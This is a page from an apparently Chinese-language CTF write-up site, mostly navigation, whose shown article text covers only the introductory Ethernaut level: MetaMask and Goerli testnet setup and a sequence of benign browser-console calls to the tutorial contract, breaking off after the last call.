      <a href="../../crypto/diophantine/" class="md-nav__link">
        Diophantine
      </a>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_6_25" type="checkbox" id="__nav_6_25" >
      
      
      
      
        <label class="md-nav__link" for="__nav_6_25">
          Google CTF 2022
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Google CTF 2022" data-md-level="2">
        <label class="md-nav__title" for="__nav_6_25">
          <span class="md-nav__icon md-icon"></span>
          Google CTF 2022
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/cycling/" class="md-nav__link">
        Cycling
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/maybe_someday/" class="md-nav__link">
        Maybe Someday
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/dynamic_rsa/" class="md-nav__link">
        Dynamic RSA
      </a>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_6_27" type="checkbox" id="__nav_6_27" >
      
      
      
      
        <label class="md-nav__link" for="__nav_6_27">
          corCTF 2022
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="corCTF 2022" data-md-level="2">
        <label class="md-nav__title" for="__nav_6_27">
          <span class="md-nav__icon md-icon"></span>
          corCTF 2022
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/exchanged/" class="md-nav__link">
        exchanged
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/leapfrog/" class="md-nav__link">
        leapfrog
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../crypto/shuffle128/" class="md-nav__link">
        shuffle128
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_7" type="checkbox" id="__nav_7" >
      
      
      
      
        <label class="md-nav__link" for="__nav_7">
          Blockchain
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Blockchain" data-md-level="1">
        <label class="md-nav__title" for="__nav_7">
          <span class="md-nav__icon md-icon"></span>
          Blockchain
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../blockchain/code_is_law/" class="md-nav__link">
        Code is Law
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../blockchain/totally_secure_dapp/" class="md-nav__link">
        Totally Secure Dapp
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../blockchain/cairo_reverse/" class="md-nav__link">
        Cairo Reverse
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../blockchain/tctf_nft_market/" class="md-nav__link">
        TCTF NFT Market
      </a>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_7_5" type="checkbox" id="__nav_7_5" >
      
      
      
      
        <label class="md-nav__link" for="__nav_7_5">
          DownUnderCTF 2022
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="DownUnderCTF 2022" data-md-level="2">
        <label class="md-nav__title" for="__nav_7_5">
          <span class="md-nav__icon md-icon"></span>
          DownUnderCTF 2022
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../blockchain/secret_and_ephemeral/" class="md-nav__link">
        Secret and Ephemeral
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../blockchain/private_log/" class="md-nav__link">
        Private Log
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../blockchain/memory_master_on_the_chain/" class="md-nav__link">
        链上记忆大师
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../blockchain/cookie_market/" class="md-nav__link">
        Cookie Market
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../blockchain/tetctftoken/" class="md-nav__link">
        TetCTFToken
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../blockchain/realwrap/" class="md-nav__link">
        realwrap
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../blockchain/evmvm/" class="md-nav__link">
        evmvm
      </a>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_7_11" type="checkbox" id="__nav_7_11" >
      
      
      
      
        <label class="md-nav__link" for="__nav_7_11">
          HackTM CTF 2023
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="HackTM CTF 2023" data-md-level="2">
        <label class="md-nav__title" for="__nav_7_11">
          <span class="md-nav__icon md-icon"></span>
          HackTM CTF 2023
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../blockchain/dragon_slayer/" class="md-nav__link">
        Dragon Slayer
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../blockchain/diamond_heist/" class="md-nav__link">
        Diamond Heist
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
    
  
  
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_8" type="checkbox" id="__nav_8" checked>
      
      
      
      
        <label class="md-nav__link" for="__nav_8">
          Wargames
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Wargames" data-md-level="1">
        <label class="md-nav__title" for="__nav_8">
          <span class="md-nav__icon md-icon"></span>
          Wargames
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../natas/" class="md-nav__link">
        Natas
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../leviathan/" class="md-nav__link">
        Leviathan
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../krypton/" class="md-nav__link">
        Krypton
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../narnia/" class="md-nav__link">
        Narnia
      </a>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_8_5" type="checkbox" id="__nav_8_5" >
      
      
      
      
        <label class="md-nav__link" for="__nav_8_5">
          Protostar
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Protostar" data-md-level="2">
        <label class="md-nav__title" for="__nav_8_5">
          <span class="md-nav__icon md-icon"></span>
          Protostar
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../protostar/stack/" class="md-nav__link">
        Stack
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../protostar/format/" class="md-nav__link">
        Format
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../protostar/heap/" class="md-nav__link">
        Heap
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../protostar/net/" class="md-nav__link">
        Net
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../protostar/final/" class="md-nav__link">
        Final
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
    
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
      
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          Ethernaut
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        Ethernaut
      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="目录">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      目录
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#0-hello-ethernaut" class="md-nav__link">
    0. Hello Ethernaut
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#1-fallback" class="md-nav__link">
    1. Fallback
  </a>
  
    <nav class="md-nav" aria-label="1. Fallback">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_1" class="md-nav__link">
    参考资料
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#2-fallout" class="md-nav__link">
    2. Fallout
  </a>
  
    <nav class="md-nav" aria-label="2. Fallout">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_2" class="md-nav__link">
    参考资料
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#3-coin-flip" class="md-nav__link">
    3. Coin Flip
  </a>
  
    <nav class="md-nav" aria-label="3. Coin Flip">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_3" class="md-nav__link">
    参考资料
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#4-telephone" class="md-nav__link">
    4. Telephone
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#5-token" class="md-nav__link">
    5. Token
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#6-delegation" class="md-nav__link">
    6. Delegation
  </a>
  
    <nav class="md-nav" aria-label="6. Delegation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_4" class="md-nav__link">
    参考资料
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#7-force" class="md-nav__link">
    7. Force
  </a>
  
    <nav class="md-nav" aria-label="7. Force">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_5" class="md-nav__link">
    参考资料
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#8-vault" class="md-nav__link">
    8. Vault
  </a>
  
    <nav class="md-nav" aria-label="8. Vault">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_6" class="md-nav__link">
    参考资料
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#9-king" class="md-nav__link">
    9. King
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#10-re-entrancy" class="md-nav__link">
    10. Re-entrancy
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#11-elevator" class="md-nav__link">
    11. Elevator
  </a>
  
    <nav class="md-nav" aria-label="11. Elevator">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_7" class="md-nav__link">
    参考资料
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#12-privacy" class="md-nav__link">
    12. Privacy
  </a>
  
    <nav class="md-nav" aria-label="12. Privacy">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_8" class="md-nav__link">
    参考资料
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#13-gatekeeper-one" class="md-nav__link">
    13. Gatekeeper One
  </a>
  
    <nav class="md-nav" aria-label="13. Gatekeeper One">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_9" class="md-nav__link">
    参考资料
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#14-gatekeeper-two" class="md-nav__link">
    14. Gatekeeper Two
  </a>
  
    <nav class="md-nav" aria-label="14. Gatekeeper Two">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_10" class="md-nav__link">
    参考资料
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#15-naught-coin" class="md-nav__link">
    15. Naught Coin
  </a>
  
    <nav class="md-nav" aria-label="15. Naught Coin">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_11" class="md-nav__link">
    参考资料
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#16-preservation" class="md-nav__link">
    16. Preservation
  </a>
  
    <nav class="md-nav" aria-label="16. Preservation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_12" class="md-nav__link">
    参考资料
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#17-recovery" class="md-nav__link">
    17. Recovery
  </a>
  
    <nav class="md-nav" aria-label="17. Recovery">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_13" class="md-nav__link">
    参考资料
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#18-magicnumber" class="md-nav__link">
    18. MagicNumber
  </a>
  
    <nav class="md-nav" aria-label="18. MagicNumber">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_14" class="md-nav__link">
    参考资料
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#19-alien-codex" class="md-nav__link">
    19. Alien Codex
  </a>
  
    <nav class="md-nav" aria-label="19. Alien Codex">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_15" class="md-nav__link">
    参考资料
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#20-denial" class="md-nav__link">
    20. Denial
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#21-shop" class="md-nav__link">
    21. Shop
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#22-dex" class="md-nav__link">
    22. Dex
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#23-dex-two" class="md-nav__link">
    23. Dex Two
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#24-puzzle-wallet" class="md-nav__link">
    24. Puzzle Wallet
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#25-motorbike" class="md-nav__link">
    25. Motorbike
  </a>
  
    <nav class="md-nav" aria-label="25. Motorbike">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#exploit" class="md-nav__link">
    Exploit
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_16" class="md-nav__link">
    参考资料
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#26-doubleentrypoint" class="md-nav__link">
    26. DoubleEntryPoint
  </a>
  
    <nav class="md-nav" aria-label="26. DoubleEntryPoint">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_17" class="md-nav__link">
    参考资料
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../solana_pathway/" class="md-nav__link">
        Solana Pathway
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../solana_security_workshop/" class="md-nav__link">
        Solana Security Workshop
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_9" type="checkbox" id="__nav_9" >
      
      
      
      
        <label class="md-nav__link" for="__nav_9">
          彩蛋
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="彩蛋" data-md-level="1">
        <label class="md-nav__title" for="__nav_9">
          <span class="md-nav__icon md-icon"></span>
          彩蛋
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../eggs/ctfhub_index/" class="md-nav__link">
        CTFHub - 首页
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../eggs/ctfhub_wechat/" class="md-nav__link">
        CTFHub - 公众号
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../eggs/ctfhub_tools/" class="md-nav__link">
        CTFHub - 工具
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../eggs/ctfhub_match/" class="md-nav__link">
        CTFHub - 赛事
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../eggs/ctfhub_exams/" class="md-nav__link">
        CTFHub - 真题
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="目录">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      目录
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#0-hello-ethernaut" class="md-nav__link">
    0. Hello Ethernaut
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#1-fallback" class="md-nav__link">
    1. Fallback
  </a>
  
    <nav class="md-nav" aria-label="1. Fallback">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_1" class="md-nav__link">
    参考资料
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#2-fallout" class="md-nav__link">
    2. Fallout
  </a>
  
    <nav class="md-nav" aria-label="2. Fallout">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_2" class="md-nav__link">
    参考资料
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#3-coin-flip" class="md-nav__link">
    3. Coin Flip
  </a>
  
    <nav class="md-nav" aria-label="3. Coin Flip">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_3" class="md-nav__link">
    参考资料
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#4-telephone" class="md-nav__link">
    4. Telephone
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#5-token" class="md-nav__link">
    5. Token
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#6-delegation" class="md-nav__link">
    6. Delegation
  </a>
  
    <nav class="md-nav" aria-label="6. Delegation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_4" class="md-nav__link">
    参考资料
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#7-force" class="md-nav__link">
    7. Force
  </a>
  
    <nav class="md-nav" aria-label="7. Force">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_5" class="md-nav__link">
    参考资料
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#8-vault" class="md-nav__link">
    8. Vault
  </a>
  
    <nav class="md-nav" aria-label="8. Vault">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_6" class="md-nav__link">
    参考资料
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#9-king" class="md-nav__link">
    9. King
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#10-re-entrancy" class="md-nav__link">
    10. Re-entrancy
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#11-elevator" class="md-nav__link">
    11. Elevator
  </a>
  
    <nav class="md-nav" aria-label="11. Elevator">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_7" class="md-nav__link">
    参考资料
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#12-privacy" class="md-nav__link">
    12. Privacy
  </a>
  
    <nav class="md-nav" aria-label="12. Privacy">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_8" class="md-nav__link">
    参考资料
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#13-gatekeeper-one" class="md-nav__link">
    13. Gatekeeper One
  </a>
  
    <nav class="md-nav" aria-label="13. Gatekeeper One">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_9" class="md-nav__link">
    参考资料
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#14-gatekeeper-two" class="md-nav__link">
    14. Gatekeeper Two
  </a>
  
    <nav class="md-nav" aria-label="14. Gatekeeper Two">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_10" class="md-nav__link">
    参考资料
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#15-naught-coin" class="md-nav__link">
    15. Naught Coin
  </a>
  
    <nav class="md-nav" aria-label="15. Naught Coin">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_11" class="md-nav__link">
    参考资料
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#16-preservation" class="md-nav__link">
    16. Preservation
  </a>
  
    <nav class="md-nav" aria-label="16. Preservation">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_12" class="md-nav__link">
    参考资料
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#17-recovery" class="md-nav__link">
    17. Recovery
  </a>
  
    <nav class="md-nav" aria-label="17. Recovery">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_13" class="md-nav__link">
    参考资料
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#18-magicnumber" class="md-nav__link">
    18. MagicNumber
  </a>
  
    <nav class="md-nav" aria-label="18. MagicNumber">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_14" class="md-nav__link">
    参考资料
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#19-alien-codex" class="md-nav__link">
    19. Alien Codex
  </a>
  
    <nav class="md-nav" aria-label="19. Alien Codex">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_15" class="md-nav__link">
    参考资料
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#20-denial" class="md-nav__link">
    20. Denial
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#21-shop" class="md-nav__link">
    21. Shop
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#22-dex" class="md-nav__link">
    22. Dex
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#23-dex-two" class="md-nav__link">
    23. Dex Two
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#24-puzzle-wallet" class="md-nav__link">
    24. Puzzle Wallet
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#25-motorbike" class="md-nav__link">
    25. Motorbike
  </a>
  
    <nav class="md-nav" aria-label="25. Motorbike">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#exploit" class="md-nav__link">
    Exploit
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#_16" class="md-nav__link">
    参考资料
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#26-doubleentrypoint" class="md-nav__link">
    26. DoubleEntryPoint
  </a>
  
    <nav class="md-nav" aria-label="26. DoubleEntryPoint">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_17" class="md-nav__link">
    参考资料
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content" data-md-component="content">
            <article class="md-content__inner md-typeset">
              
  

  
                
  <a href="https://github.com/YanhuiJessica/Chictf-Writeups/edit/master/docs/wargames/ethernaut.md" title="编辑此页" class="md-content__button md-icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25Z"/></svg>
  </a>



  <h1>Ethernaut</h1>

<div class="blogging-tags-grid">

        <a href="#blockchain" class="blogging-tag"><code>#blockchain</code></a>

        <a href="#smart contract" class="blogging-tag"><code>#smart contract</code></a>

        <a href="#solidity" class="blogging-tag"><code>#solidity</code></a>

    </div>

<style>
    .md-typeset .blogging-tags-grid {
        display: flex;
        flex-direction: row;
        flex-wrap: wrap;
        gap: 8px;
        margin-top: 5px;
    }

    .md-typeset .blogging-tag {
        color: var(--md-typeset-color);
        background-color: var(--md-typeset-code-color);
    }

    .md-typeset .blogging-tag code {
        border-radius: 5px;
    }
</style>
<h2 id="0-hello-ethernaut">0. Hello Ethernaut<a class="headerlink" href="#0-hello-ethernaut" title="Permanent link">&para;</a></h2>
<ul>
<li>登录 MetaMask，将 MetaMask 切换到 Goerli 测试网络<ul>
<li>若没有则需要在 <code>设置-&gt;高级</code> 中开启「Show test networks」</li>
</ul>
</li>
<li>在浏览器的控制台可以收到一些消息，其中一条为玩家地址<ul>
<li>可以使用 <code>player</code> 命令随时查看玩家地址，MetaMask 也可以直接复制</li>
</ul>
</li>
<li>
<p>查看当前余额：<code>getBalance(player)</code></p>
<ul>
<li>
<p>如果显示 <code>pending</code>，可改用 <code>await getBalance(player)</code> 来获得清晰的结果</p>
<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">getBalance</span><span class="p">(</span><span class="nx">player</span><span class="p">)</span>
<span class="s2">&quot;0&quot;</span>
</code></pre></div>
</li>
</ul>
</li>
<li>
<p>在控制台输入 <code>ethernaut</code> 查看游戏的主要合约</p>
<ul>
<li>合约的 ABI（Application Binary Interfaces）提供了所有 Ethernaut.sol 的公开方法，如所有者，可通过 <code>ethernaut.owner()</code> 查看</li>
<li>并不需要直接与 Ethernaut.sol 合约交互，而是通过关卡实例</li>
</ul>
</li>
<li>获取测试用以太币用于支付汽油费：<a href="https://goerlifaucet.com/">1</a> / <a href="https://goerli-faucet.pk910.de/">2</a> / <a href="https://www.allthatnode.com/faucet/ethereum.dsrv">3</a> / <a href="https://goerlifaucet.org/">4</a></li>
<li>点击「Get new instance」并在 MetaMask 授权交易</li>
<li>
<p>查看合约信息并根据提示交互</p>
<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">info</span><span class="p">()</span>
<span class="s2">&quot;You will find what you need in info1().&quot;</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">info1</span><span class="p">()</span>
<span class="s2">&quot;Try info2(), but with \&quot;hello\&quot; as a parameter.&quot;</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">info2</span><span class="p">(</span><span class="s2">&quot;hello&quot;</span><span class="p">)</span>
<span class="s2">&quot;The property infoNum holds the number of the next info method to call.&quot;</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">infoNum</span><span class="p">()</span>
<span class="p">{</span>
<span class="w">  </span><span class="s2">&quot;negative&quot;</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span>
<span class="w">  </span><span class="s2">&quot;words&quot;</span><span class="o">:</span><span class="w"> </span><span class="p">[</span>
<span class="w">    </span><span class="mf">42</span><span class="p">,</span>
<span class="w">    </span><span class="kc">null</span>
<span class="w">  </span><span class="p">],</span>
<span class="w">  </span><span class="s2">&quot;length&quot;</span><span class="o">:</span><span class="w"> </span><span class="mf">1</span><span class="p">,</span>
<span class="w">  </span><span class="s2">&quot;red&quot;</span><span class="o">:</span><span class="w"> </span><span class="kc">null</span>
<span class="p">}</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">info42</span><span class="p">()</span>
<span class="s2">&quot;theMethodName is the name of the next method.&quot;</span>
<span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">theMethodName</span><span class="p">()</span>
